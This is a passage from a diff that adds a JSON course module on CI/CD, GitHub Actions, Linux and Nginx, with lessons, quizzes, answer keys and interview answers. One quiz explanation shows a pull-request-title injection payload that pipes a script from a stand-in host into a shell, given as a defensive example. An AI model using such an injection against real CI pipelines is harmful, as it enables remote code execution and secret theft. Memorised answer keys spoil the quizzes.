@@ -1,0 +1,1847 @@
+{
+  "id": "devops-cloud",
+  "title": "DevOps, CI/CD and Cloud",
+  "area": "devops",
+  "order": 51,
+  "icon": "OPS",
+  "color": "#7c3aed",
+  "description": "Ship code safely and repeatably: CI/CD pipelines with GitHub Actions, deployment strategies, AWS core services, Kubernetes, Terraform, Nginx, Linux and observability. Built for full stack engineers who own their deploys.",
+  "chapters": [
+    {
+      "id": "devops-cloud-01-cicd-basics",
+      "title": "CI/CD Fundamentals",
+      "level": "beginner",
+      "summary": "What continuous integration, delivery and deployment mean, and what a healthy pipeline looks like.",
+      "estMinutes": 25,
+      "lesson": [
+        {
+          "heading": "Why CI/CD exists",
+          "body": "Before CI/CD, teams merged long-lived branches every few weeks and spent days resolving conflicts and fixing broken builds. Releases were manual, rare and scary.\n\n**Continuous Integration (CI)** means every developer merges small changes into the main branch often (at least daily), and every change is automatically built and tested. The goal is to find integration problems minutes after they are introduced, while the change is still fresh in the author's head.\n\n**Continuous Delivery** extends CI: every change that passes the pipeline produces a release candidate that *could* go to production with one click. **Continuous Deployment** goes one step further: every passing change *is* deployed to production automatically, with no human approval.\n\n- CI answers: does this change build and pass tests together with everyone else's code?\n- Continuous delivery answers: is this build always releasable?\n- Continuous deployment answers: can we release without a human in the loop?"
+        },
+        {
+          "heading": "Anatomy of a pipeline",
+          "body": "A pipeline is an ordered set of stages triggered by an event (push, pull request, tag, schedule). A typical web app pipeline:\n\n- **Install**: restore dependencies, ideally from a cache keyed on the lockfile.\n- **Static checks**: lint, format check, type check (`tsc --noEmit`).\n- **Test**: unit tests, then integration tests against real services (Postgres, Redis) started as containers.\n- **Build**: compile and produce an **artifact** (a Docker image, a zip, a `.next` build).\n- **Publish**: push the artifact to a registry tagged with the commit SHA.\n- **Deploy**: promote the same artifact to staging, run smoke tests, then to production.\n\nThe golden rule is **build once, deploy many**. The exact artifact tested in staging is the one that reaches production. Rebuilding per environment means you ship something you never tested."
+        },
+        {
+          "heading": "Fast feedback and pipeline design",
+          "body": "A pipeline that takes 40 minutes gets ignored or bypassed. Order stages so the cheapest, most likely failures run first (lint and type check before slow end-to-end tests). Run independent jobs in parallel. Cache dependencies. Split large test suites across shards.\n\nKeep the main branch always green. If main breaks, fixing it is the team's top priority, because every other change is now being tested on a broken base.\n\n- **Fail fast**: stop the pipeline on the first failing stage.\n- **Deterministic builds**: pin dependency versions via lockfiles and use `npm ci`, not `npm install`.\n- **Hermetic tests**: tests should not depend on shared external state that other runs mutate.\n- **Flaky tests** erode trust. Quarantine and fix them; do not just add retries forever.",
+          "code": {
+            "lang": "bash",
+            "source": "# Typical CI steps for a Node/TypeScript app\nnpm ci                 # exact install from package-lock.json\nnpm run lint\nnpx tsc --noEmit       # type check only\nnpm test -- --ci\nnpm run build\ndocker build -t registry.example.com/app:$GIT_SHA .\ndocker push registry.example.com/app:$GIT_SHA"
+          }
+        },
+        {
+          "heading": "Trunk-based development and feature flags",
+          "body": "CI works best with **trunk-based development**: short-lived branches (hours to a couple of days) merged into `main` via pull requests. Long-lived feature branches defeat CI because the integration is delayed.\n\nTo merge unfinished work safely, hide it behind a **feature flag**. The code ships to production but is switched off. This decouples **deploy** (putting code on servers) from **release** (exposing behavior to users). Flags also enable gradual rollouts and instant kill switches.\n\nGotcha: flags are technical debt. Remove them once a feature is fully rolled out, or you end up with an untestable combinatorial mess."
+        },
+        {
+          "heading": "Environments and promotion",
+          "body": "Most teams run at least **dev/preview**, **staging** and **production**. Preview environments are created per pull request (Vercel and Netlify do this by default) so reviewers can click through the change.\n\nStaging should mirror production as closely as possible: same container image, same infrastructure code, similar data shape. Differences belong in configuration (environment variables), never in code branches like `if (env === 'staging')`.\n\nProduction deploys should require the pipeline to be green and may require a manual approval (continuous delivery) or none (continuous deployment). Every deploy must be **reversible**: keep the previous artifact so rollback is a redeploy, not a rebuild."
+        }
+      ],
+      "keyPoints": [
+        "CI = merge small changes often and automatically build and test each one.",
+        "Continuous delivery keeps every green build releasable; continuous deployment releases it automatically.",
+        "Build the artifact once, tag it with the commit SHA, and promote the same artifact through environments.",
+        "Order stages for fast feedback: cheap checks first, parallelize, cache dependencies.",
+        "Use `npm ci` and lockfiles for deterministic builds.",
+        "Feature flags decouple deploy from release and enable trunk-based development.",
+        "Environment differences live in config, not in code paths.",
+        "Every deploy should be reversible by redeploying the previous artifact."
+      ],
+      "questions": [
+        {
+          "id": "devops-cloud-01-q01",
+          "type": "mcq",
+          "prompt": "What is the key difference between continuous delivery and continuous deployment?",
+          "options": [
+            "Continuous delivery runs tests; continuous deployment does not",
+            "Continuous deployment releases every passing change to production automatically; continuous delivery keeps it releasable but a human triggers the release",
+            "Continuous delivery is only for mobile apps",
+            "They are the same thing with different names"
+          ],
+          "answer": 1,
+          "explanation": "Both produce a releasable artifact from every green build. Continuous deployment removes the manual approval step so production receives every passing change automatically."
+        },
+        {
+          "id": "devops-cloud-01-q02",
+          "type": "mcq",
+          "prompt": "Why do pipelines follow 'build once, deploy many'?",
+          "options": [
+            "It saves registry storage",
+            "Rebuilding per environment can produce a different artifact than the one you tested",
+            "Docker cannot rebuild images",
+            "Staging and production use different programming languages"
+          ],
+          "answer": 1,
+          "explanation": "A rebuild may pull different dependency versions or base images. Promoting the exact tested artifact guarantees production runs what staging validated."
+        },
+        {
+          "id": "devops-cloud-01-q03",
+          "type": "mcq",
+          "prompt": "Which command should a CI job use to install Node dependencies?",
+          "options": [
+            "npm install",
+            "npm ci",
+            "npm update",
+            "npx install"
+          ],
+          "answer": 1,
+          "explanation": "`npm ci` installs exactly what is in package-lock.json, fails if the lockfile and package.json disagree, and deletes node_modules first. That makes builds reproducible."
+        },
+        {
+          "id": "devops-cloud-01-q04",
+          "type": "mcq",
+          "prompt": "A pipeline runs end-to-end tests (12 min), then lint (30 s), then type check (1 min). What is the best improvement?",
+          "options": [
+            "Remove the type check",
+            "Run lint and type check first (or in parallel) so cheap failures surface in seconds",
+            "Run the end-to-end tests twice",
+            "Move all checks to a nightly job"
+          ],
+          "answer": 1,
+          "explanation": "Fast feedback means cheapest and most likely failures first. A lint error should not wait 12 minutes behind slow tests."
+        },
+        {
+          "id": "devops-cloud-01-q05",
+          "type": "mcq",
+          "prompt": "What does a feature flag primarily allow?",
+          "options": [
+            "Skipping code review",
+            "Deploying code to production while keeping the feature hidden until it is released",
+            "Running tests faster",
+            "Encrypting environment variables"
+          ],
+          "answer": 1,
+          "explanation": "Flags separate deploy from release, so incomplete work can merge to main and be enabled gradually or rolled back instantly without a redeploy."
+        },
+        {
+          "id": "devops-cloud-01-q06",
+          "type": "mcq",
+          "prompt": "How should an image built in CI be tagged for traceability?",
+          "options": [
+            "Always `latest`",
+            "With the git commit SHA (optionally plus a semver tag)",
+            "With the developer's name",
+            "With the current date only"
+          ],
+          "answer": 1,
+          "explanation": "The commit SHA is immutable and maps an artifact back to the exact source. `latest` is mutable, so you cannot tell what is actually running."
+        },
+        {
+          "id": "devops-cloud-01-q07",
+          "type": "truefalse",
+          "prompt": "Long-lived feature branches merged once a month are compatible with the goals of continuous integration.",
+          "answer": false,
+          "explanation": "CI requires integrating frequently. Month-long branches delay integration and create the large, painful merges CI is meant to avoid."
+        },
+        {
+          "id": "devops-cloud-01-q08",
+          "type": "truefalse",
+          "prompt": "Adding automatic retries to flaky tests is a complete fix for flakiness.",
+          "answer": false,
+          "explanation": "Retries hide the symptom and can mask real race conditions. Flaky tests should be quarantined, investigated and fixed."
+        },
+        {
+          "id": "devops-cloud-01-q09",
+          "type": "multi",
+          "prompt": "Select all that apply: which practices make a pipeline faster without reducing safety?",
+          "options": [
+            "Caching dependencies keyed on the lockfile",
+            "Running independent jobs in parallel",
+            "Deleting slow tests",
+            "Sharding a large test suite across runners",
+            "Skipping CI on pull requests"
+          ],
+          "answers": [
+            0,
+            1,
+            3
+          ],
+          "explanation": "Caching, parallelism and sharding cut wall-clock time while keeping coverage. Deleting tests or skipping PR checks reduces safety."
+        },
+        {
+          "id": "devops-cloud-01-q10",
+          "type": "fill",
+          "prompt": "Fill the blank: The practice of merging small changes into main at least daily, with each change built and tested automatically, is called continuous ___.",
+          "accept": [
+            "integration",
+            "integration (CI)",
+            "CI"
+          ],
+          "explanation": "Continuous integration is the foundation; delivery and deployment build on top of it."
+        },
+        {
+          "id": "devops-cloud-01-q11",
+          "type": "interview",
+          "prompt": "Explain the difference between CI, continuous delivery and continuous deployment, and which you would choose for a fintech app.",
+          "answer": "- CI: every change merged to main frequently is automatically built and tested, catching integration bugs early.\n- Continuous delivery: every green build produces a releasable artifact; a human (or a schedule) decides when to push it to production.\n- Continuous deployment: every green build goes to production automatically.\n- For fintech I would start with continuous delivery: automated pipeline to staging, then a gated production promotion with audit trail, because regulators often require change approval. With strong test coverage, canary releases, feature flags and automatic rollback on SLO breach, the team can move toward continuous deployment for low-risk services while keeping approvals for money-moving code paths.",
+          "level": "beginner"
+        },
+        {
+          "id": "devops-cloud-01-q12",
+          "type": "interview",
+          "prompt": "Your CI pipeline takes 45 minutes and developers are bypassing it. How do you fix it?",
+          "answer": "- Measure first: get per-step timings to find the real bottleneck.\n- Cache dependencies and build outputs (npm cache, Docker layer cache, Turborepo/Nx remote cache).\n- Reorder for fast feedback: lint, type check and unit tests first; fail fast.\n- Parallelize independent jobs and shard slow test suites across runners.\n- Only run what changed: path filters or affected-project detection in monorepos.\n- Move very slow suites (full E2E, load tests) to run on merge to main or nightly, keeping a smoke subset on PRs.\n- Fix or quarantine flaky tests so reruns are not needed.\n- Enforce the pipeline via branch protection (required status checks) once it is fast enough to be respected.",
+          "level": "intermediate"
+        },
+        {
+          "id": "devops-cloud-01-q13",
+          "type": "interview",
+          "prompt": "What makes a deployment safe to roll back, and what can break rollbacks?",
+          "answer": "- Immutable, versioned artifacts (image tagged by SHA) so rollback is redeploying the previous version, not rebuilding.\n- Config stored outside the artifact and versioned too.\n- Database migrations that are backward compatible (expand and contract): the old code must still work against the new schema. Destructive migrations (dropping or renaming a column) in the same deploy are the classic rollback breaker.\n- Feature flags so many issues are fixed by turning a flag off instead of redeploying.\n- Other breakers: changed message/event formats consumed by other services, cache entries written in a new format, and one-way external side effects (emails sent, payments taken).",
+          "level": "intermediate"
+        }
+      ],
+      "resources": [
+        {
+          "title": "Martin Fowler - Continuous Integration",
+          "url": "https://martinfowler.com/articles/continuousIntegration.html"
+        },
+        {
+          "title": "Atlassian - Continuous integration vs delivery vs deployment",
+          "url": "https://www.atlassian.com/continuous-delivery/principles/continuous-integration-vs-delivery-vs-deployment"
+        },
+        {
+          "title": "Martin Fowler - Feature Toggles",
+          "url": "https://martinfowler.com/articles/feature-toggles.html"
+        }
+      ]
+    },
+    {
+      "id": "devops-cloud-02-github-actions",
+      "title": "GitHub Actions Basics",
+      "level": "beginner",
+      "summary": "Workflows, events, jobs, steps, runners and actions: write a working CI workflow for a Node app.",
+      "estMinutes": 30,
+      "lesson": [
+        {
+          "heading": "The building blocks",
+          "body": "GitHub Actions runs automation defined in YAML files under `.github/workflows/`. The vocabulary:\n\n- **Workflow**: one YAML file. It has a name, triggers (`on:`) and jobs.\n- **Event**: what triggers a workflow: `push`, `pull_request`, `workflow_dispatch` (manual button), `schedule` (cron), `release`, and many more.\n- **Job**: a set of steps that runs on one **runner** (a fresh VM or container). Jobs run in parallel by default.\n- **Step**: either a shell command (`run:`) or a reusable **action** (`uses:`). Steps in a job run sequentially and share the same filesystem.\n- **Runner**: the machine. GitHub-hosted runners like `ubuntu-latest` are fresh VMs per job; self-hosted runners are your own machines.\n\nBecause each job gets a fresh machine, files do not carry over between jobs unless you use artifacts or caches."
+        },
+        {
+          "heading": "A complete CI workflow",
+          "body": "This workflow runs on pushes to `main` and on every pull request. `actions/checkout` clones the repo; `actions/setup-node` installs Node and, with `cache: npm`, caches the npm download cache keyed on the lockfile.\n\nThe `concurrency` block cancels an in-progress run for the same branch when a new commit is pushed, which saves runner minutes.\n\nThe `permissions` block limits the automatically provided `GITHUB_TOKEN` to read-only repository contents. Least privilege is a good default for every workflow.",
+          "code": {
+            "lang": "yaml",
+            "source": "name: CI\non:\n  push:\n    branches: [main]\n  pull_request:\n\npermissions:\n  contents: read\n\nconcurrency:\n  group: ci-${{ github.ref }}\n  cancel-in-progress: true\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: 22\n          cache: npm\n      - run: npm ci\n      - run: npm run lint\n      - run: npx tsc --noEmit\n      - run: npm test -- --ci"
+          }
+        },
+        {
+          "heading": "Job dependencies, outputs and artifacts",
+          "body": "Use `needs:` to order jobs. A `deploy` job with `needs: [test, build]` only runs if both succeed.\n\nTo pass files between jobs, upload with `actions/upload-artifact` and download with `actions/download-artifact`. To pass small values, use **job outputs**: a step writes `name=value` to the file at `$GITHUB_OUTPUT`, and later jobs read `needs.<job>.outputs.<name>`.\n\nConditions use `if:`. Common ones: `if: github.ref == 'refs/heads/main'` to deploy only from main, `if: failure()` to run a notification step only when something failed, `if: always()` to run cleanup regardless.",
+          "code": {
+            "lang": "yaml",
+            "source": "jobs:\n  build:\n    runs-on: ubuntu-latest\n    outputs:\n      version: ${{ steps.ver.outputs.version }}\n    steps:\n      - uses: actions/checkout@v4\n      - id: ver\n        run: echo \"version=$(git rev-parse --short HEAD)\" >> \"$GITHUB_OUTPUT\"\n      - run: npm ci && npm run build\n      - uses: actions/upload-artifact@v4\n        with:\n          name: dist\n          path: dist/\n\n  deploy:\n    needs: build\n    if: github.ref == 'refs/heads/main'\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/download-artifact@v4\n        with:\n          name: dist\n      - run: echo \"Deploying ${{ needs.build.outputs.version }}\""
+          }
+        },
+        {
+          "heading": "Expressions, contexts and variables",
+          "body": "`${{ ... }}` is an expression evaluated by GitHub before the step runs. Contexts available inside include `github` (event, ref, sha, actor), `env`, `vars` (configuration variables), `secrets`, `matrix`, `steps`, `needs` and `runner`.\n\n- `env:` can be set at workflow, job or step level; the narrowest scope wins.\n- `vars.NAME` reads non-secret configuration variables set in repo or org settings.\n- `secrets.NAME` reads encrypted secrets; values are masked in logs.\n\n**Security gotcha**: never interpolate untrusted input such as `${{ github.event.pull_request.title }}` directly into a `run:` script. A malicious PR title can inject shell commands. Pass it through an environment variable instead and reference `\"$TITLE\"` in the shell."
+        },
+        {
+          "heading": "Using and pinning actions",
+          "body": "`uses: owner/repo@ref` runs a published action. The ref can be a tag (`@v4`), a branch, or a full commit SHA. Tags are mutable: if a third-party action's maintainer (or an attacker who compromises their account) moves the tag, your workflow runs new code. In 2025 the compromise of the popular `tj-actions/changed-files` action showed this is a real risk.\n\nFor third-party actions, pin to a full-length commit SHA and let Dependabot update it. First-party `actions/*` on major tags are a common accepted trade-off.\n\nYou can also write reusable logic as a **composite action** (a group of steps in your repo) or a **reusable workflow** called with `uses: ./.github/workflows/deploy.yml` from a job."
+        }
+      ],
+      "keyPoints": [
+        "Workflows live in `.github/workflows/*.yml` and are triggered by events under `on:`.",
+        "Jobs run in parallel on fresh runners; steps inside a job run sequentially and share a filesystem.",
+        "Use `needs:` for ordering, artifacts for files and `$GITHUB_OUTPUT` job outputs for small values between jobs.",
+        "Set `permissions:` to least privilege for the `GITHUB_TOKEN`.",
+        "Use `concurrency` with `cancel-in-progress` to avoid wasting minutes on superseded commits.",
+        "Never interpolate untrusted event data directly into `run:` scripts; pass it via env vars.",
+        "Pin third-party actions to a commit SHA."
+      ],
+      "questions": [
+        {
+          "id": "devops-cloud-02-q01",
+          "type": "mcq",
+          "prompt": "Where must GitHub Actions workflow files be placed?",
+          "options": [
+            ".github/actions/",
+            ".github/workflows/",
+            ".ci/",
+            "workflows/ at the repo root"
+          ],
+          "answer": 1,
+          "explanation": "GitHub only discovers workflows in `.github/workflows/` with a `.yml` or `.yaml` extension."
+        },
+        {
+          "id": "devops-cloud-02-q02",
+          "type": "mcq",
+          "prompt": "A job writes a file `report.json`. A second job in the same workflow tries to read it and the file is missing. Why?",
+          "options": [
+            "The second job ran first",
+            "Each job runs on a fresh runner, so files must be passed with artifacts",
+            "Files over 1 KB are deleted automatically",
+            "JSON files are ignored by runners"
+          ],
+          "answer": 1,
+          "explanation": "Jobs do not share a filesystem. Use `actions/upload-artifact` and `actions/download-artifact` (or a cache) to move files between jobs."
+        },
+        {
+          "id": "devops-cloud-02-q03",
+          "type": "mcq",
+          "prompt": "What does this block do?",
+          "code": "concurrency:\n  group: ci-${{ github.ref }}\n  cancel-in-progress: true",
+          "options": [
+            "Runs all jobs in parallel",
+            "Cancels an in-progress run for the same ref when a newer run starts",
+            "Limits the workflow to one runner forever",
+            "Retries failed jobs"
+          ],
+          "answer": 1,
+          "explanation": "Runs sharing a concurrency group are serialized; `cancel-in-progress: true` cancels the older run so only the latest commit is tested."
+        },
+        {
+          "id": "devops-cloud-02-q04",
+          "type": "mcq",
+          "prompt": "How does a step set an output that later steps or jobs can read?",
+          "options": [
+            "echo \"::set-env name=x::1\"",
+            "echo \"x=1\" >> \"$GITHUB_OUTPUT\"",
+            "export x=1",
+            "Write to /tmp/outputs"
+          ],
+          "answer": 1,
+          "explanation": "Appending `name=value` to the file in `$GITHUB_OUTPUT` is the current mechanism. The old `::set-output` and `::set-env` workflow commands are deprecated/disabled."
+        },
+        {
+          "id": "devops-cloud-02-q05",
+          "type": "mcq",
+          "prompt": "Why is this step dangerous?",
+          "code": "- run: echo \"Title: ${{ github.event.pull_request.title }}\"",
+          "options": [
+            "echo is slow",
+            "The PR title is attacker controlled and is pasted into the shell script before it runs, allowing command injection",
+            "Titles are secrets",
+            "It is not dangerous"
+          ],
+          "answer": 1,
+          "explanation": "Expressions are substituted into the script text. A title like `\"; curl evil.sh | sh; \"` runs. Pass it as `env: TITLE: ...` and use `\"$TITLE\"`."
+        },
+        {
+          "id": "devops-cloud-02-q06",
+          "type": "mcq",
+          "prompt": "Which event lets you trigger a workflow manually from the GitHub UI?",
+          "options": [
+            "manual",
+            "workflow_dispatch",
+            "repository_run",
+            "on_demand"
+          ],
+          "answer": 1,
+          "explanation": "`workflow_dispatch` adds a 'Run workflow' button and can accept typed inputs."
+        },
+        {
+          "id": "devops-cloud-02-q07",
+          "type": "truefalse",
+          "prompt": "Steps within the same job share the runner's filesystem.",
+          "answer": true,
+          "explanation": "All steps of a job execute on the same runner in sequence, so a file created by one step is visible to the next."
+        },
+        {
+          "id": "devops-cloud-02-q08",
+          "type": "truefalse",
+          "prompt": "Referencing a third-party action by a version tag like @v2 guarantees the code you run never changes.",
+          "answer": false,
+          "explanation": "Git tags can be moved. Only a full commit SHA is immutable, which is why security guidance recommends SHA pinning for third-party actions."
+        },
+        {
+          "id": "devops-cloud-02-q09",
+          "type": "multi",
+          "prompt": "Select all that apply: which are valid ways to order or share data between jobs?",
+          "options": [
+            "needs:",
+            "Job outputs via $GITHUB_OUTPUT",
+            "upload-artifact / download-artifact",
+            "Writing to /home/runner and reading it in another job",
+            "Global shell variables"
+          ],
+          "answers": [
+            0,
+            1,
+            2
+          ],
+          "explanation": "`needs` creates the dependency, outputs carry small values and artifacts carry files. Runner filesystems and shell variables are not shared across jobs."
+        },
+        {
+          "id": "devops-cloud-02-q10",
+          "type": "fill",
+          "prompt": "Fill the blank: To make a job run only after the `build` job succeeds, add `___: build` to it.",
+          "accept": [
+            "needs",
+            "needs:"
+          ],
+          "explanation": "`needs` declares job dependencies and skips the job if a dependency fails (unless an `if:` overrides it)."
+        },
+        {
+          "id": "devops-cloud-02-q11",
+          "type": "interview",
+          "prompt": "Walk me through a GitHub Actions workflow you would write for a Next.js app's pull requests.",
+          "answer": "- Trigger on `pull_request` (and `push` to main), with `permissions: contents: read` and a `concurrency` group per ref with cancel-in-progress.\n- Job 1 `checks`: checkout, setup-node with npm cache, `npm ci`, lint, `tsc --noEmit`, unit tests with coverage.\n- Job 2 `build`: `next build` with the build cache (`.next/cache`) restored via actions/cache, so incremental builds are fast.\n- Job 3 `e2e`: needs build, starts the app, runs Playwright against it, uploads the HTML report as an artifact on failure.\n- Preview deploy handled by Vercel's Git integration or a deploy job that comments the URL on the PR.\n- Branch protection makes `checks` and `e2e` required status checks.",
+          "level": "beginner"
+        },
+        {
+          "id": "devops-cloud-02-q12",
+          "type": "interview",
+          "prompt": "How do you secure GitHub Actions workflows?",
+          "answer": "- Least privilege `permissions:` at workflow level, elevating per job only when needed.\n- Pin third-party actions to commit SHAs and keep them updated with Dependabot.\n- Never interpolate untrusted inputs (PR titles, branch names, issue bodies) into `run:`; pass via env vars.\n- Be careful with `pull_request_target` and `workflow_run`: they run with secrets in the base repo context, so never check out and execute untrusted PR code in them.\n- Use environments with required reviewers for production secrets.\n- Prefer OIDC federation to cloud providers over long-lived access keys stored as secrets.\n- Restrict self-hosted runners to private repos, since forks could run arbitrary code on them.",
+          "level": "intermediate"
+        },
+        {
+          "id": "devops-cloud-02-q13",
+          "type": "interview",
+          "prompt": "What is the difference between a composite action and a reusable workflow?",
+          "answer": "- A composite action bundles steps; it is used as a single step (`uses:`) inside a job and runs on the caller's runner, sharing its filesystem.\n- A reusable workflow (`on: workflow_call`) bundles whole jobs; it is called at the job level with `uses: org/repo/.github/workflows/x.yml@ref`, can define its own runners, environments and multiple jobs, and receives inputs and secrets explicitly (or `secrets: inherit`).\n- Use a composite action for a repeated sequence like 'setup node + install + cache'. Use a reusable workflow to standardize an entire pipeline (build, scan, deploy) across many repos.",
+          "level": "intermediate"
+        }
+      ],
+      "resources": [
+        {
+          "title": "GitHub Actions documentation",
+          "url": "https://docs.github.com/en/actions"
+        },
+        {
+          "title": "Workflow syntax for GitHub Actions",
+          "url": "https://docs.github.com/en/actions/writing-workflows/workflow-syntax-for-github-actions"
+        },
+        {
+          "title": "Security hardening for GitHub Actions",
+          "url": "https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions"
+        }
+      ]
+    },
+    {
+      "id": "devops-cloud-03-linux-nginx",
+      "title": "Linux Server Basics and Nginx Reverse Proxy",
+      "level": "beginner",
+      "summary": "The Linux commands, permissions, processes and Nginx config you need to run a Node app on a server.",
+      "estMinutes": 30,
+      "lesson": [
+        {
+          "heading": "Navigating and inspecting a server",
+          "body": "Most production servers run Linux (Ubuntu, Debian, Amazon Linux). You connect with `ssh user@host`, ideally using key-based auth with password login disabled.\n\nCommands you will use daily:\n\n- `ls -la`, `cd`, `pwd`, `cat`, `less`, `tail -f /var/log/app.log` (follow a log).\n- `grep -r \"ERROR\" /var/log/app` to search; `find / -name '*.pem'` to locate files.\n- `df -h` (disk usage per filesystem), `du -sh *` (size per directory), `free -h` (memory).\n- `top` or `htop` (live CPU/memory per process), `ps aux | grep node`.\n- `ss -tlnp` (which process listens on which TCP port; replaces `netstat`).\n- `curl -I http://localhost:3000` to test an endpoint from the box itself.\n- `journalctl -u myapp -f` to follow logs of a systemd service.\n\nA classic outage cause is a full disk (`df -h` shows 100%), often from unrotated logs or old Docker images."
+        },
+        {
+          "heading": "Users, permissions and sudo",
+          "body": "Every file has an owner, a group and permission bits for **u**ser, **g**roup and **o**thers: read (4), write (2), execute (1). `chmod 640 secrets.env` means owner rw, group r, others nothing. `chown app:app /srv/app` changes ownership.\n\nRun services as an unprivileged user, not root. If the app is compromised, the attacker gets only that user's rights. Use `sudo` for administrative actions; avoid logging in as root.\n\nPrivate keys and env files should be `600` or `640`. SSH refuses to use a private key that is world readable.",
+          "code": {
+            "lang": "bash",
+            "source": "sudo useradd --system --create-home --shell /usr/sbin/nologin app\nsudo chown -R app:app /srv/app\nchmod 600 /srv/app/.env      # rw for owner only\nls -l /srv/app/.env\n# -rw------- 1 app app 512 Mar  3 10:12 /srv/app/.env"
+          }
+        },
+        {
+          "heading": "Running the app as a systemd service",
+          "body": "**systemd** is the init system on almost every modern distro. A unit file tells it how to start your app, restart it on crash and start it on boot. Commands: `systemctl start|stop|restart|status myapp`, `systemctl enable myapp` (start at boot), `journalctl -u myapp` (logs).\n\nAlternatives for Node include PM2 or running the app in a container under Docker with a restart policy. Whatever you use, the process must be supervised so a crash does not mean downtime.",
+          "code": {
+            "lang": "ini",
+            "source": "# /etc/systemd/system/myapp.service\n[Unit]\nDescription=My Node API\nAfter=network.target\n\n[Service]\nUser=app\nWorkingDirectory=/srv/app\nEnvironmentFile=/srv/app/.env\nExecStart=/usr/bin/node dist/server.js\nRestart=on-failure\nRestartSec=3\n\n[Install]\nWantedBy=multi-user.target"
+          }
+        },
+        {
+          "heading": "Nginx as a reverse proxy",
+          "body": "A **reverse proxy** sits in front of your app servers and receives client requests on their behalf. Your Node app listens on `127.0.0.1:3000`; Nginx listens on ports 80/443 and forwards requests.\n\nWhy put Nginx in front:\n\n- **TLS termination**: Nginx handles HTTPS certificates (for example from Let's Encrypt via certbot).\n- **Static files and caching**: serves assets efficiently and can cache upstream responses.\n- **Load balancing** across multiple app instances via an `upstream` block.\n- **Buffering and protection**: absorbs slow clients, enforces body size limits, rate limits, and gzip/brotli compression.\n\nBecause the app now sees Nginx as the client, forward the original details with headers like `X-Forwarded-For` and `X-Forwarded-Proto`, and configure the app to trust the proxy (for example `app.set('trust proxy', 1)` in Express).",
+          "code": {
+            "lang": "nginx",
+            "source": "upstream api {\n    server 127.0.0.1:3000;\n    server 127.0.0.1:3001;\n    keepalive 32;\n}\n\nserver {\n    listen 443 ssl;\n    http2 on;\n    server_name api.example.com;\n    ssl_certificate     /etc/letsencrypt/live/api.example.com/fullchain.pem;\n    ssl_certificate_key /etc/letsencrypt/live/api.example.com/privkey.pem;\n    client_max_body_size 10m;\n\n    location / {\n        proxy_pass http://api;\n        proxy_http_version 1.1;\n        proxy_set_header Host $host;\n        proxy_set_header X-Real-IP $remote_addr;\n        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n        proxy_set_header X-Forwarded-Proto $scheme;\n    }\n}\n\nserver {\n    listen 80;\n    server_name api.example.com;\n    return 301 https://$host$request_uri;\n}"
+          }
+        },
+        {
+          "heading": "Nginx gotchas: WebSockets, trailing slashes and reloads",
+          "body": "**WebSockets** need the upgrade headers: `proxy_set_header Upgrade $http_upgrade;` and `proxy_set_header Connection \"upgrade\";` with `proxy_http_version 1.1`. Without them, socket connections fail with 400 or fall back to polling.\n\n**Trailing slash in proxy_pass** changes the path: with `location /api/ { proxy_pass http://app/; }` a request to `/api/users` reaches the app as `/users` (the matched prefix is replaced). Without the trailing slash (`proxy_pass http://app;`) the full original URI `/api/users` is forwarded.\n\nAlways run `sudo nginx -t` to test configuration before `sudo systemctl reload nginx`. A reload applies config without dropping existing connections; a broken config fails the test instead of taking the site down.\n\nA **502 Bad Gateway** means Nginx could not get a valid response from the upstream (app down or wrong port). A **504 Gateway Timeout** means the upstream was too slow (tune `proxy_read_timeout` or fix the slow endpoint)."
+        }
+      ],
+      "keyPoints": [
+        "Use `ss -tlnp`, `df -h`, `free -h`, `htop` and `journalctl -u` to diagnose a server quickly.",
+        "Permission bits are r=4, w=2, x=1 for user, group, others; secrets should be 600/640.",
+        "Run apps as an unprivileged user under a supervisor such as systemd with Restart=on-failure.",
+        "Nginx as reverse proxy handles TLS, load balancing, compression, static files and buffering.",
+        "Forward client info with X-Forwarded-For/X-Forwarded-Proto and make the app trust the proxy.",
+        "A trailing slash on proxy_pass rewrites the matched location prefix.",
+        "502 = upstream unreachable or bad response; 504 = upstream timed out.",
+        "Always `nginx -t` before `systemctl reload nginx`."
+      ],
+      "questions": [
+        {
+          "id": "devops-cloud-03-q01",
+          "type": "mcq",
+          "prompt": "Which command shows which process is listening on TCP port 3000?",
+          "options": [
+            "df -h",
+            "ss -tlnp",
+            "chmod 3000",
+            "free -h"
+          ],
+          "answer": 1,
+          "explanation": "`ss -tlnp` lists TCP (-t) listening (-l) sockets numerically (-n) with the owning process (-p)."
+        },
+        {
+          "id": "devops-cloud-03-q02",
+          "type": "mcq",
+          "prompt": "What permissions does `chmod 640 app.env` set?",
+          "options": [
+            "Owner read/write, group read, others none",
+            "Owner read, group read/write, others none",
+            "Everyone read/write",
+            "Owner execute only"
+          ],
+          "answer": 0,
+          "explanation": "6 = 4+2 (read+write) for owner, 4 = read for group, 0 = nothing for others."
+        },
+        {
+          "id": "devops-cloud-03-q03",
+          "type": "mcq",
+          "prompt": "Users suddenly get 502 Bad Gateway from Nginx. What is the most likely cause?",
+          "options": [
+            "The TLS certificate expired",
+            "The upstream app process crashed or is not listening on the configured port",
+            "The client sent too many cookies",
+            "DNS is misconfigured for the domain"
+          ],
+          "answer": 1,
+          "explanation": "502 means Nginx reached its upstream step but got no valid response, typically connection refused because the app is down. A DNS issue would prevent reaching Nginx at all."
+        },
+        {
+          "id": "devops-cloud-03-q04",
+          "type": "mcq",
+          "prompt": "Given this config, what path does the app receive for a request to /api/users?",
+          "code": "location /api/ {\n    proxy_pass http://127.0.0.1:3000/;\n}",
+          "options": [
+            "/api/users",
+            "/users",
+            "/api/api/users",
+            "/"
+          ],
+          "answer": 1,
+          "explanation": "When proxy_pass includes a URI (the trailing `/`), Nginx replaces the matched location prefix `/api/` with it, so the app sees `/users`."
+        },
+        {
+          "id": "devops-cloud-03-q05",
+          "type": "mcq",
+          "prompt": "WebSocket connections through Nginx fail with errors, while normal HTTP works. What is missing?",
+          "options": [
+            "gzip on;",
+            "The Upgrade and Connection headers with proxy_http_version 1.1",
+            "A larger client_max_body_size",
+            "An additional server_name"
+          ],
+          "answer": 1,
+          "explanation": "The WebSocket handshake is an HTTP/1.1 Upgrade. Nginx does not forward hop-by-hop Upgrade/Connection headers unless you set them explicitly."
+        },
+        {
+          "id": "devops-cloud-03-q06",
+          "type": "mcq",
